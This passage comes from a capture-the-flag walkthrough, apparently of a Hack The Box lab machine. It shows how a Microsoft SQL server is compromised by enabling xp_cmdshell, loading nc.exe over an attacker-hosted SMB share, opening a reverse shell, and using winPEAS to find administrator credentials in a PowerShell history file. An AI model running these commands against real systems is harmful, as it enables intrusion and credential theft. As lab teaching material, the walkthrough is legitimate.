With mssqlclient.py and sql_svc:M3g4c0rp123 credentials we go in

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

Here we can execute commands by ``xp_cmdshell {command}`` but is deactivated. We check if we are admin by using ``SELECT is_srvrolemember('sysadmin');`` and it returns 1 so yes, we are an admin user. We can enable xp_cmdshell executing the command ``enable_xp_cmdshell``.

Now we try some commands and we will see that we are located inside System32 folder

```bash
SQL> xp_cmdshell dir
output                                                                           
--------------------------------------------------------------------------------   
 Volume in drive C has no label.                                                 
 Volume Serial Number is 9565-0B4F                                                 
NULL                                                                               
 Directory of C:\Windows\system32
```

We try to get a reverse shell with the binary nc.exe but it doesn't work because nc is not located in the system

```bash
SQL> xp_cmdshell nc.exe -e cmd.exe 10.10.15.9 8000
output                                                                             
--------------------------------------------------------------------------------   
'nc.exe' is not recognized as an internal or external command,     
operable program or batch file.
```

So we create a smb folder in our kali machine and we will try to upload and execute nc.exe . First we try a smb folder without authentication but it fails

```bash
SERVER IN OUR KALI LINUX
┌──(kali㉿kali)-[~]
└─$ sudo impacket-smbserver share -smb2support ~/Documents/StartingPoint

<----------------->

MSSQL SERVER
SQL> xp_cmdshell copy \\10.10.15.9\share\nc.exe
output                                                                             
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.   

NULL
```

So we have to build a smb folder with authentication

```bash
SERVER IN OUR KALI LINUX
┌──(kali㉿kali)-[~]
└─$ sudo impacket-smbserver share -smb2support ~/Documents/StartingPoint -user test -password test

<----------------->

MSSQL SERVER
SQL> xp_cmdshell net use n: \\10.10.15.9\share /user:test test
output            

The command completed successfully.
```

And now we have the nc.exe bin in the server. Open a netcat listener and we got a shell as sql_svc user

```bash
SQL> xp_cmdshell \\10.10.15.9\share\nc.exe -e cmd.exe 10.10.15.9 8000

<----------------->

C:\Windows\system32>whoami
whoami
archetype\sql_svc
```

Now we have to enumerate so lets try with winPEAS. We download it from **[here](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)** and we will use our previous smb session (open again if you have closed the connection). We execute the binary without storing it

```bash
C:\Windows\system32>\\10.10.15.9\share\winPEASx64.exe
```

And it will execute winPEAS, where we can see a file located in C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt where we retrieve the admin credentials (administrator:MEGACORP_4dm1n!!)

Now we can get a nt authority\system session using psexec.py script from impacket

```bash
┌──(kali㉿kali)-[~/Documents/StartingPoint]
